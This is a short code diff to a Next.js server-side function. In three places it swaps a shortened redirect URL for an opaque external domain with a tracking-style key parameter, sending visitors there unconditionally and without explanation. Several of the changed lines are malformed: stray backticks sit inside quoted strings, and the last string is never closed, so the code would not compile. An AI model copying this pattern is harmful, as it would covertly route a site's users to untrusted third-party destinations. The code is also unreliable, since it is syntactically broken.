@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://rb.gy/y28wc`
+					`https://threefortressfork.com/pxawz6gw25?key=dba99f626f33ef5c0918b8f43bcfbfec`
 				}`,
 			},
 		};
@@ -29,7 +29,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
     return {
         redirect: {
             permanent: false,
-            destination: '`https://rb.gy/y28wc',
+            destination: '`https://threefortressfork.com/pxawz6gw25?key=dba99f626f33ef5c0918b8f43bcfbfec',
         },
     };
 }
@@ -38,7 +38,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
     return {
         redirect: {
             permanent: false,
-            destination: '`https://rb.gy/y28wc,
+            destination: '`https://threefortressfork.com/pxawz6gw25?key=dba99f626f33ef5c0918b8f43bcfbfec,
         },
     };
 }
